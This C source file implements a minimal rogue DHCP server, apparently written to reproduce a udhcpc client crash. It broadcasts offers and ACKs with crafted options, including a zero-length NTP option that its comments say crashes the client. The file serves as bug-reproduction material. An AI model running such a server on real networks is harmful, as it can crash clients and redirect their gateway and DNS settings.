/*
 * dirty dhcp server
*/
#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<arpa/inet.h>
#include<sys/socket.h>
 
#define BUFLEN 1500
#define PORT 67 //We listen on 67 for DHCP Discover from clients

struct DHCP_message {
    uint8_t op_code;
    uint8_t htype;
    uint8_t hlen;
    uint8_t hops;
    uint32_t xid;
    uint16_t secs;
    uint16_t flags;
    uint32_t ciaddr; //client ip address - only filled-in if renewing
    uint32_t yiaddr; //address offered to client
    uint32_t siaddr;
    uint32_t giaddr;
    uint8_t chaddr[16]; //client mac address
    uint8_t sname[64];
    uint8_t file[128];
    uint8_t cookie[4]; //magic cookie 99,130,83,99 (in decimal)
    uint8_t options[1500]; //1500 is too big, but works;
};

 
void die(char *s)
{
    perror(s);
    exit(1);
}

void print_dhcp_message( uint8_t* data, uint32_t length )
{

    printf("============= DHCP MESSAGE START ================\n");
    struct DHCP_message* dhcp = NULL;
    dhcp = (struct DHCP_message*)data;
    printf("OpCode %d\n", dhcp->op_code);
    printf("Hardware Type %d\n", dhcp->htype);
    printf("Hardware Address Length %d\n", dhcp->hlen);
    printf("Hops %d\n", dhcp->hops);
    printf("Transaction ID %04x\n", dhcp->xid);
    printf("Secs %d\n", dhcp->secs);
    printf("Flags %d\n", dhcp->flags);
    char ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(dhcp->ciaddr), ip, INET_ADDRSTRLEN);
    printf("Client IP %s\n", ip);
    memset((char *) &ip, 0, sizeof(ip));
    inet_ntop(AF_INET, &(dhcp->yiaddr), ip, INET_ADDRSTRLEN);
    printf("Your IP %s\n", ip);

    memset((char *) &ip, 0, sizeof(ip));
    inet_ntop(AF_INET, &(dhcp->siaddr), ip, INET_ADDRSTRLEN);
    printf("Next Server IP %s\n", ip);
    memset((char *) &ip, 0, sizeof(ip));
    inet_ntop(AF_INET, &(dhcp->giaddr), ip, INET_ADDRSTRLEN);
    printf("Relay Agent IP %s\n", ip);

    int i;
    printf("Client Mac ");
    for(i=0; i < dhcp->hlen; i++ )
    {
        printf("%02x", dhcp->chaddr[i]);
    }
    printf("\n");

    printf("Server hostname %s\n", dhcp->sname);
    printf("Boot file name %s\n", dhcp->file);
    printf("Magic Cookie ");
    for(i=0; i<4; i++)
    {
        printf("%d ", dhcp->cookie[i]);
    }
    printf("\n");

    uint8_t* pos=dhcp->options;
    uint8_t* end =(uint8_t*)dhcp+length;
    while( pos < end )
    {
        int option = *pos;
        if( option == 255 )
        {
            printf("Option %d\n", option);
            break;
        }
        ++pos;
        int length = *pos;
        ++pos;
        pos+=length;
        printf("Option %d length %d\n", option, length);
    }
    printf("=================================================\n");
}

void create_boot_reply( struct DHCP_message* discover, uint32_t dlength, struct DHCP_message* offer, uint8_t message_type )
{
    offer->op_code = 2;
    offer->htype = 1;
    offer->hlen = 6;
    offer->xid = discover->xid;
    inet_pton(AF_INET, "172.16.10.10", &offer->yiaddr);
    memcpy(&offer->chaddr, &discover->chaddr, discover->hlen);
    offer->cookie[0] = 99;
    offer->cookie[1] = 130;
    offer->cookie[2] = 83;
    offer->cookie[3] = 99;
    
    //these options are special and should cause udhcpc to crash
    //this is a hacky way to add the options but it reproduces our issue
    uint8_t* pos=offer->options;

    *pos=53;++pos;
    *pos=1;++pos;
    *pos=message_type;++pos;

    *pos=54;++pos;
    *pos=4;++pos;
    inet_pton(AF_INET, "172.16.10.1", pos);pos+=4;

    *pos=51;++pos;
    *pos=4;++pos;
    uint32_t* tmp = (uint32_t*)pos;
    *tmp=3600;pos+=4;

    *pos=58;++pos;
    *pos=4;++pos;
    tmp = (uint32_t*)pos;
    *tmp=1800;pos+=4;

    *pos=59;++pos;
    *pos=4;++pos;
    tmp = (uint32_t*)pos;
    *tmp=3150;pos+=4;

    *pos=1;++pos;
    *pos=4;++pos;
    inet_pton(AF_INET, "255.255.255.0", pos);pos+=4;

    *pos=3;++pos;
    *pos=4;++pos;
    inet_pton(AF_INET, "172.16.10.1", pos);pos+=4;

    *pos=6;++pos;
    *pos=16;++pos;
    inet_pton(AF_INET, "192.168.25.12", pos);pos+=4;
    inet_pton(AF_INET, "216.171.129.14", pos);pos+=4;
    inet_pton(AF_INET, "192.168.25.12", pos);pos+=4;
    inet_pton(AF_INET, "216.171.129.14", pos);pos+=4;

    //--- Comment/Uncomment these lines to crash udhcpc
    *pos=42;++pos;
    *pos=0;++pos;

    *pos=255;
}

void broadcast_send(int sock, char* buf, size_t len)
{
    /* Construct local address structure */
    struct sockaddr_in bcast_addr;                               /* Broadcast address */
    memset(&bcast_addr, 0, sizeof(bcast_addr));                  /* Zero out structure */
    bcast_addr.sin_family = AF_INET;                             /* Internet address family */
    bcast_addr.sin_addr.s_addr = inet_addr("255.255.255.255");   /* Broadcast IP address */
    bcast_addr.sin_port = htons(68);                             /* Broadcast port */

     
    //now reply the client with the same data
    if (sendto(sock, buf, len, 0, (struct sockaddr*) &bcast_addr, sizeof(bcast_addr)) == -1)
    {
        die("sendto()");
    }
}
 
int main(void)
{
    struct sockaddr_in local, remote;
     
    int sock;
     
    if ((sock=socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
    {
        die("socket");
    }
     
    memset((char *) &local, 0, sizeof(local));
    local.sin_family = AF_INET;
    local.sin_port = htons(PORT);
    local.sin_addr.s_addr = htonl(INADDR_ANY);
     
    //bind socket to port
    if( bind(sock, (struct sockaddr*)&local, sizeof(local) ) == -1)
    {
        die("bind");
    }
     
    int bcast = 1;
    if( setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &bcast, sizeof(bcast)) < 0 )
    {
        die("setsockopt");
    }

    int recv_len;
    char buf[BUFLEN];
    int slen = sizeof(remote);
    while(1)
    {
        if ((recv_len = recvfrom(sock, buf, BUFLEN, 0, (struct sockaddr *) &remote, &slen)) == -1)
        {
            die("recvfrom()");
        }
         
        printf("Received packet from %s:%d\n", inet_ntoa(remote.sin_addr), ntohs(remote.sin_port));
        struct DHCP_message* dhcp = (struct DHCP_message*)buf;
        if( dhcp->op_code == 1 )
        {
            print_dhcp_message( buf, recv_len );
            char offer[548];
            memset(offer, 0, sizeof(offer));
            uint8_t* pos = dhcp->options;

            //This is hacky since option 53 doesnt have to be first, but it works for now
            if( *pos == 53 )
            {
                pos+=2;
                if( *pos == 1 )
                {
                    printf("Sending offer\n");
                    //offer = 2
                    create_boot_reply( dhcp, recv_len, (struct DHCP_message*)offer, 2 );
                    broadcast_send(sock, offer, sizeof(offer));
                }
                else if( *pos == 3 )
                {
                    //ack = 5
                    printf("Sending ACK\n");
                    create_boot_reply( dhcp, recv_len, (struct DHCP_message*)offer, 5 );
                    broadcast_send(sock, offer, sizeof(offer));
                }
            }
        }
        else if( dhcp->op_code == 2 )
        {
            //servers send replies, they don't handle them
        }
        else
        {
            printf("unhandled DHCP op code\n");
        }
    }
    close(sock);
    return 0;
}
